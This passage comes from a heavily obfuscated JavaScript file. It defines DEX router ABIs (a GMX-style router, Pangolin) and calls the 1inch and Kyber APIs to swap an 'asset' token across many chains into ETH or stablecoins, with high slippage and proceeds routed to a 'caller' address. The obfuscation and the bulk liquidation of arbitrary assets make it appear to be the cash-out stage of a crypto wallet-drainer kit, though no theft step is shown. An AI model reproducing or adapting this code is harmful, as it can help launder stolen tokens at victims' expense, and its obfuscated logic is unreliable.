            type: 'uint256'
          };
          const _0x39fd5d = {
            anonymous: false,
            inputs: [_0x24c2d3, _0x2af58a, _0x497f8f, _0x195d83, _0x5436c4],
            name: "Swap",
            type: 'event'
          };
          const _0xf16a19 = {
            internalType: "address",
            name: "_plugin",
            type: "address"
          };
          const _0x18c7d5 = {
            inputs: [_0xf16a19],
            name: "addPlugin",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x26cd5a = {
            internalType: "address",
            name: "_plugin",
            type: "address"
          };
          const _0x5d8a34 = {
            inputs: [_0x26cd5a],
            name: "approvePlugin",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5a2ae6 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x2d1367 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x5a17ee = {
            inputs: [_0x5a2ae6, _0x2d1367],
            name: "approvedPlugins",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1ff9b5 = {
            internalType: "address",
            name: "_collateralToken",
            type: "address"
          };
          const _0x49f8fb = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x1da266 = {
            internalType: 'uint256',
            name: "_collateralDelta",
            type: 'uint256'
          };
          const _0xf448cc = {
            internalType: "uint256",
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x4acc8a = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x22d1ed = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x277729 = {
            internalType: 'uint256',
            name: '_price',
            type: "uint256"
          };
          const _0x362c1a = {
            inputs: [_0x1ff9b5, _0x49f8fb, _0x1da266, _0xf448cc, _0x4acc8a, _0x22d1ed, _0x277729],
            name: "decreasePosition",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2f05db = {
            internalType: "address[]",
            name: '_path',
            type: "address[]"
          };
          const _0x5b45be = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x364590 = {
            internalType: 'uint256',
            name: "_collateralDelta",
            type: 'uint256'
          };
          const _0x5d2825 = {
            internalType: 'uint256',
            name: '_sizeDelta',
            type: 'uint256'
          };
          const _0x3899f9 = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x421be2 = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x53a312 = {
            internalType: 'uint256',
            name: '_price',
            type: 'uint256'
          };
          const _0x4914c2 = {
            internalType: 'uint256',
            name: "_minOut",
            type: "uint256"
          };
          const _0x429f3f = {
            inputs: [_0x2f05db, _0x5b45be, _0x364590, _0x5d2825, _0x3899f9, _0x421be2, _0x53a312, _0x4914c2],
            name: "decreasePositionAndSwap",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3102b3 = {
            internalType: "address[]",
            name: '_path',
            type: "address[]"
          };
          const _0x46afef = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x200962 = {
            internalType: "uint256",
            name: "_collateralDelta",
            type: 'uint256'
          };
          const _0x5c41ab = {
            internalType: 'uint256',
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x481326 = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x435498 = {
            internalType: "address payable",
            name: "_receiver",
            type: "address"
          };
          const _0x1ff4f8 = {
            internalType: 'uint256',
            name: '_price',
            type: 'uint256'
          };
          const _0x258e0f = {
            internalType: 'uint256',
            name: "_minOut",
            type: 'uint256'
          };
          const _0x33fcad = {
            inputs: [_0x3102b3, _0x46afef, _0x200962, _0x5c41ab, _0x481326, _0x435498, _0x1ff4f8, _0x258e0f],
            name: "decreasePositionAndSwapETH",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5084ca = {
            internalType: "address",
            name: "_collateralToken",
            type: "address"
          };
          const _0x1f4000 = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x3a336d = {
            internalType: 'uint256',
            name: "_collateralDelta",
            type: 'uint256'
          };
          const _0x1bec9f = {
            internalType: 'uint256',
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x273db8 = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x17f5a4 = {
            internalType: "address payable",
            name: "_receiver",
            type: "address"
          };
          const _0x594d10 = {
            internalType: "uint256",
            name: '_price',
            type: 'uint256'
          };
          const _0x296b4e = {
            inputs: [_0x5084ca, _0x1f4000, _0x3a336d, _0x1bec9f, _0x273db8, _0x17f5a4, _0x594d10],
            name: "decreasePositionETH",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x23aae1 = {
            internalType: "address",
            name: "_plugin",
            type: 'address'
          };
          const _0x5c6667 = {
            inputs: [_0x23aae1],
            name: 'denyPlugin',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3b0722 = {
            internalType: "address",
            name: '_token',
            type: "address"
          };
          const _0x320e7c = {
            internalType: 'uint256',
            name: "_amount",
            type: 'uint256'
          };
          const _0x523048 = {
            inputs: [_0x3b0722, _0x320e7c],
            name: "directPoolDeposit",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5db09c = {
            inputs: [],
            name: "gov",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x48fd84 = {
            internalType: "address[]",
            name: "_path",
            type: "address[]"
          };
          const _0x4cd75d = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x1b5319 = {
            internalType: "uint256",
            name: "_amountIn",
            type: "uint256"
          };
          const _0x5ab8cf = {
            internalType: 'uint256',
            name: "_minOut",
            type: 'uint256'
          };
          const _0x112c5b = {
            internalType: 'uint256',
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x4ab7fc = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x4a58fb = {
            internalType: 'uint256',
            name: "_price",
            type: 'uint256'
          };
          const _0x13d323 = {
            inputs: [_0x48fd84, _0x4cd75d, _0x1b5319, _0x5ab8cf, _0x112c5b, _0x4ab7fc, _0x4a58fb],
            name: "increasePosition",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x16a8bc = {
            internalType: "address[]",
            name: '_path',
            type: "address[]"
          };
          const _0x17fef3 = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x70db72 = {
            internalType: 'uint256',
            name: "_minOut",
            type: 'uint256'
          };
          const _0x8efb32 = {
            internalType: 'uint256',
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x308860 = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0xbcae3f = {
            internalType: "uint256",
            name: "_price",
            type: 'uint256'
          };
          const _0x54612d = {
            inputs: [_0x16a8bc, _0x17fef3, _0x70db72, _0x8efb32, _0x308860, _0xbcae3f],
            name: "increasePositionETH",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x937d4c = {
            internalType: "address",
            name: "_account",
            type: "address"
          };
          const _0x501f08 = {
            internalType: "address",
            name: "_collateralToken",
            type: "address"
          };
          const _0x159340 = {
            internalType: "address",
            name: "_indexToken",
            type: "address"
          };
          const _0x102ee1 = {
            internalType: 'uint256',
            name: "_collateralDelta",
            type: 'uint256'
          };
          const _0x39f2a5 = {
            internalType: "uint256",
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x10f02a = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x470f1d = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x185151 = {
            inputs: [_0x937d4c, _0x501f08, _0x159340, _0x102ee1, _0x39f2a5, _0x10f02a, _0x470f1d],
            name: "pluginDecreasePosition",
            outputs: [{
              'internalType': "uint256",
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x5480f8 = {
            internalType: "address",
            name: "_account",
            type: "address"
          };
          const _0x46dc64 = {
            internalType: "address",
            name: "_collateralToken",
            type: "address"
          };
          const _0x1d59e7 = {
            internalType: "address",
            name: "_indexToken",
            type: 'address'
          };
          const _0x88434f = {
            internalType: 'uint256',
            name: "_sizeDelta",
            type: 'uint256'
          };
          const _0x2090f0 = {
            internalType: "bool",
            name: "_isLong",
            type: "bool"
          };
          const _0x326fd7 = {
            inputs: [_0x5480f8, _0x46dc64, _0x1d59e7, _0x88434f, _0x2090f0],
            name: "pluginIncreasePosition",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x37f455 = {
            internalType: "address",
            name: '_token',
            type: "address"
          };
          const _0x3f616c = {
            internalType: "address",
            name: "_account",
            type: "address"
          };
          const _0x33403c = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x26d01d = {
            internalType: 'uint256',
            name: '_amount',
            type: 'uint256'
          };
          const _0x4ec660 = {
            inputs: [_0x37f455, _0x3f616c, _0x33403c, _0x26d01d],
            name: "pluginTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2e9983 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x2e1ae0 = {
            inputs: [_0x2e9983],
            name: "plugins",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x879ff = {
            internalType: 'address',
            name: "_plugin",
            type: "address"
          };
          const _0x1dc6d4 = {
            inputs: [_0x879ff],
            name: "removePlugin",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x54ae8d = {
            internalType: "address",
            name: "_gov",
            type: "address"
          };
          const _0x1c6aee = {
            inputs: [_0x54ae8d],
            name: "setGov",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x36c2e2 = {
            internalType: "address[]",
            name: "_path",
            type: "address[]"
          };
          const _0x59a586 = {
            internalType: 'uint256',
            name: "_amountIn",
            type: 'uint256'
          };
          const _0x1b49c8 = {
            internalType: 'uint256',
            name: "_minOut",
            type: 'uint256'
          };
          const _0x283761 = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x3ff879 = {
            inputs: [_0x36c2e2, _0x59a586, _0x1b49c8, _0x283761],
            name: 'swap',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x162357 = {
            internalType: "address[]",
            name: '_path',
            type: "address[]"
          };
          const _0x3d5ed1 = {
            internalType: 'uint256',
            name: "_minOut",
            type: 'uint256'
          };
          const _0x586a6a = {
            internalType: "address",
            name: "_receiver",
            type: "address"
          };
          const _0x202d5e = {
            inputs: [_0x162357, _0x3d5ed1, _0x586a6a],
            name: "swapETHToTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2fae49 = {
            internalType: "address[]",
            name: '_path',
            type: "address[]"
          };
          const _0x407c81 = {
            internalType: 'uint256',
            name: "_amountIn",
            type: "uint256"
          };
          const _0x4b36e0 = {
            internalType: 'uint256',
            name: "_minOut",
            type: 'uint256'
          };
          const _0x3f8d97 = {
            internalType: "address payable",
            name: "_receiver",
            type: "address"
          };
          const _0x4ea5cd = {
            inputs: [_0x2fae49, _0x407c81, _0x4b36e0, _0x3f8d97],
            name: "swapTokensToETH",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x24d297 = {
            inputs: [],
            name: "usdg",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xa0feb9 = {
            inputs: [],
            name: 'vault',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2fad39 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x41d3d0 = {
            inputs: [],
            name: "weth",
            outputs: [_0x2fad39],
            stateMutability: "view",
            type: "function"
          };
          const _0x445691 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x37b84c = [_0x2b58e1, _0x39fd5d, _0x18c7d5, _0x5d8a34, _0x5a17ee, _0x362c1a, _0x429f3f, _0x33fcad, _0x296b4e, _0x5c6667, _0x523048, _0x5db09c, _0x13d323, _0x54612d, _0x185151, _0x326fd7, _0x4ec660, _0x2e1ae0, _0x1dc6d4, _0x1c6aee, _0x3ff879, _0x202d5e, _0x4ea5cd, _0x24d297, _0xa0feb9, _0x41d3d0, _0x445691];
          let _0x360582 = new ethers.Contract(_0x3941f8, _0x37b84c, _0xab3127);
          let _0x53e11a = [];
          _0x53e11a[0] = _0x2a18aa.asset.token;
          _0x53e11a[1] = "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1";
          try {
            let _0x3cac70 = this.token_array.find(_0x1b205a => _0x1b205a.token_address == _0x2a18aa.asset.token && _0x1b205a.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x3cac70.value) * Number(0.7) / Number(ethPrice)).toString(), "ether"));
          } catch {}
          return [_0x360582.swap(_0x53e11a, _0x2a18aa.asset.amount, _0xcd0737, this.getCaller(_0x2a18aa)), "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1"];
        }
      case "1InchV5":
        {
          let _0x148934 = this.oneInchKeys[0];
          let _0x248e3f = await fetch("https://api.1inch.dev/swap/v5.2/" + this.getChainId(_0x2a18aa.chain) + "/swap?src=" + _0x2a18aa.asset.token + "&dst=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&amount=" + _0x2a18aa.asset.amount + "&from=" + (await this.getWalletAddress()) + "&slippage=20&receiver=" + this.getCaller(_0x2a18aa), {
            'method': 'GET',
            'Headers': {
              'Authentication': "Bearer " + _0x148934,
              'Accept': "*/*"
            }
          });
          if (_0x248e3f.status == 200) {
            let _0x32b77a = (await _0x248e3f.json()).tx;
            return [_0xab3127.sendTransaction(_0x32b77a), "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"];
          } else {
            return [false, ''];
          }
        }
      case "Kyber":
        {
          let _0x43e897 = "ethereum";
          switch (_0x2a18aa.chain) {
            case 'eth':
              _0x43e897 = "ethereum";
              break;
            case 'avax':
              _0x43e897 = "avalanche";
              break;
            case 'bsc':
              _0x43e897 = 'bsc';
              break;
            case 'arb':
              _0x43e897 = "arbitrum";
              break;
            case "cro":
              _0x43e897 = 'cronos';
              break;
            case "ftm":
              _0x43e897 = "fantom";
              break;
            case "matic":
              _0x43e897 = "polygon";
              break;
            case 'op':
              _0x43e897 = "optimism";
              break;
            case 'base':
              _0x43e897 = "base";
              break;
            case "era":
              _0x43e897 = "zksync";
              break;
          }
          let _0x25e243 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
          if (_0x2a18aa.asset.token == "0xdac17f958d2ee523a2206206994597c13d831ec7") {
            _0x25e243 = "0x6b175474e89094c44da98b954eedeac495271d0f";
          }
          const _0x24580a = {
            "x-client-id": "LiquidityMarkets"
          };
          let _0x10a15d = await fetch("https://aggregator-api.kyberswap.com/" + _0x43e897 + "/api/v1/routes?tokenIn=" + _0x2a18aa.asset.token + "&tokenOut=" + _0x25e243 + '&amountIn=' + _0x2a18aa.asset.amount + "&source=LiquidityMarkets", {
            'method': 'GET',
            'headers': _0x24580a
          });
          if (_0x10a15d.status == 200) {
            let _0x11c98e = await _0x10a15d.json();
            console.log(_0x11c98e);
            let _0x441d7e = {
              'routeSummary': _0x11c98e.data.routeSummary,
              'deadline': _0x4d5eff,
              'slippageTolerance': 0x14,
              'sender': await this.getWalletAddress(),
              'recipient': this.getCaller(_0x2a18aa),
              'source': "LiquidityMarkets"
            };
            let _0x4f88de = await fetch("https://aggregator-api.kyberswap.com/" + _0x43e897 + "/api/v1/route/build", {
              'method': 'POST',
              'body': JSON.stringify(_0x441d7e),
              'headers': {
                'x-client-id': "LiquidityMarkets"
              }
            });
            if (_0x4f88de.status == 200) {
              let _0x2c3a72 = await _0x4f88de.json();
              const _0x19c74a = {
                'from': await this.getWalletAddress(),
                'to': _0x2c3a72.data.routerAddress,
                'data': _0x2c3a72.data.data,
                'gasLimit': '0x' + _0x2c3a72.data.gas.toString(16)
              };
              return [_0xab3127.sendTransaction(_0x19c74a), _0x25e243];
            } else {
              return [false, ''];
            }
          } else {
            return [false, ''];
          }
        }
      case "Pangolin":
        {
          const _0x252a43 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x165748 = {
            internalType: "address",
            name: "_WAVAX",
            type: "address"
          };
          const _0x3fcdcd = {
            inputs: [_0x252a43, _0x165748],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x43302a = {
            inputs: [],
            name: 'WAVAX',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3465df = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x3712e0 = {
            internalType: "address",
            name: "tokenB",
            type: 'address'
          };
          const _0x19b283 = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x423166 = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x5030a3 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x599425 = {
            internalType: "uint256",
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x5bb396 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5c25a0 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x25a727 = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x48bdf0 = {
            internalType: 'uint256',
            name: "amountB",
            type: 'uint256'
          };
          const _0x3de4df = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x185100 = {
            inputs: [_0x3465df, _0x3712e0, _0x19b283, _0x423166, _0x5030a3, _0x599425, _0x5bb396, _0x5c25a0],
            name: "addLiquidity",
            outputs: [_0x25a727, _0x48bdf0, _0x3de4df],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x219e37 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x24c543 = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x64ea06 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x48adf6 = {
            internalType: "uint256",
            name: "amountAVAXMin",
            type: "uint256"
          };
          const _0x4a10a9 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x20cc3b = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x44b90a = {
            inputs: [_0x219e37, _0x24c543, _0x64ea06, _0x48adf6, _0x4a10a9, _0x20cc3b],
            name: "addLiquidityAVAX",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': 'amountAVAX',
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x25b968 = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x7f88a0 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x52181c = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x537da1 = {
            internalType: 'uint256',
            name: 'reserveOut',
            type: 'uint256'
          };
          const _0x11b8c6 = {
            internalType: 'uint256',
            name: "amountIn",
            type: 'uint256'
          };
          const _0x5d7813 = {
            inputs: [_0x7f88a0, _0x52181c, _0x537da1],
            name: "getAmountIn",
            outputs: [_0x11b8c6],
            stateMutability: 'pure',
            type: 'function'
          };
          const _0x9ce2b2 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x5f8303 = {
            internalType: 'uint256',
            name: 'reserveIn',
            type: 'uint256'
          };
          const _0x1fe290 = {
            internalType: "uint256",
            name: 'reserveOut',
            type: "uint256"
          };
          const _0x8724f4 = {
            inputs: [_0x9ce2b2, _0x5f8303, _0x1fe290],
            name: "getAmountOut",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x48bc9b = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x42bb77 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x13c244 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: "uint256[]"
          };
          const _0x3d3af3 = {
            inputs: [_0x48bc9b, _0x42bb77],
            name: "getAmountsIn",
            outputs: [_0x13c244],
            stateMutability: "view",
            type: "function"
          };
          const _0x5eaf3b = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x3d6468 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x41b29a = {
            inputs: [_0x5eaf3b, _0x3d6468],
            name: "getAmountsOut",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': "uint256[]"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1b06bc = {
            internalType: 'uint256',
            name: "amountA",
            type: "uint256"
          };
          const _0xfea9cd = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x30f2ab = {
            internalType: 'uint256',
            name: "reserveB",
            type: "uint256"
          };
          const _0x7cb6fd = {
            inputs: [_0x1b06bc, _0xfea9cd, _0x30f2ab],
            name: "quote",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x4de40e = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x55aa12 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x145f6f = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x37da9b = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x3be99c = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x347dd8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x54b92b = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x35c537 = {
            inputs: [_0x4de40e, _0x55aa12, _0x145f6f, _0x37da9b, _0x3be99c, _0x347dd8, _0x54b92b],
            name: "removeLiquidity",
            outputs: [{
              'internalType': "uint256",
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x37fd81 = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x34a47b = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x57584b = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x22b3a9 = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x4c46a0 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x256f00 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x1ea99e = {
            inputs: [_0x37fd81, _0x34a47b, _0x57584b, _0x22b3a9, _0x4c46a0, _0x256f00],
            name: "removeLiquidityAVAX",
            outputs: [{
              'internalType': "uint256",
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountAVAX",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2d686f = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x6b72c6 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3aa201 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x13c5c4 = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x35d2f1 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x2b2946 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x28244c = {
            inputs: [_0x2d686f, _0x6b72c6, _0x3aa201, _0x13c5c4, _0x35d2f1, _0x2b2946],
            name: "removeLiquidityAVAXSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': "uint256",
              'name': "amountAVAX",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5c91a8 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x1832c8 = {
            internalType: "uint256",
            name: "liquidity",
            type: "uint256"
          };
          const _0xb0e00e = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x247191 = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x56f4e2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x32beb8 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0xa0f504 = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x2f4c4f = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x3c5ecc = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x283f2f = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x2620fb = {
            internalType: 'uint256',
            name: "amountToken",
            type: 'uint256'
          };
          const _0x12ee8b = {
            internalType: 'uint256',
            name: 'amountAVAX',
            type: 'uint256'
          };
          const _0x16ae1b = {
            inputs: [_0x5c91a8, _0x1832c8, _0xb0e00e, _0x247191, _0x56f4e2, _0x32beb8, _0xa0f504, _0x2f4c4f, _0x3c5ecc, _0x283f2f],
            name: "removeLiquidityAVAXWithPermit",
            outputs: [_0x2620fb, _0x12ee8b],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1386d5 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x36480b = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x57d678 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x5671cf = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: "uint256"
          };
          const _0x5d55da = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x20cf67 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x18b49a = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0xbfd53e = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x4b3928 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x291631 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x4a4160 = {
            internalType: 'uint256',
            name: 'amountAVAX',
            type: 'uint256'
          };
          const _0x1e4aa9 = {
            inputs: [_0x1386d5, _0x36480b, _0x57d678, _0x5671cf, _0x5d55da, _0x20cf67, _0x18b49a, _0xbfd53e, _0x4b3928, _0x291631],
            name: "removeLiquidityAVAXWithPermitSupportingFeeOnTransferTokens",
            outputs: [_0x4a4160],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2ebba8 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x2cae86 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x4d53be = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0xddad16 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: "uint256"
          };
          const _0x43cba3 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x69f45e = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x23aa26 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x11add9 = {
            internalType: "bool",
            name: 'approveMax',
            type: "bool"
          };
          const _0x5c61da = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x47ca80 = {
            internalType: 'bytes32',
            name: 'r',
            type: "bytes32"
          };
          const _0x360316 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x4e6146 = {
            inputs: [_0x2ebba8, _0x2cae86, _0x4d53be, _0xddad16, _0x43cba3, _0x69f45e, _0x23aa26, _0x11add9, _0x5c61da, _0x47ca80, _0x360316],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xe6b47a = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x291114 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x3d5b0e = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x119006 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x1db655 = {
            inputs: [_0xe6b47a, _0x291114, _0x3d5b0e, _0x119006],
            name: "swapAVAXForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x22fce1 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
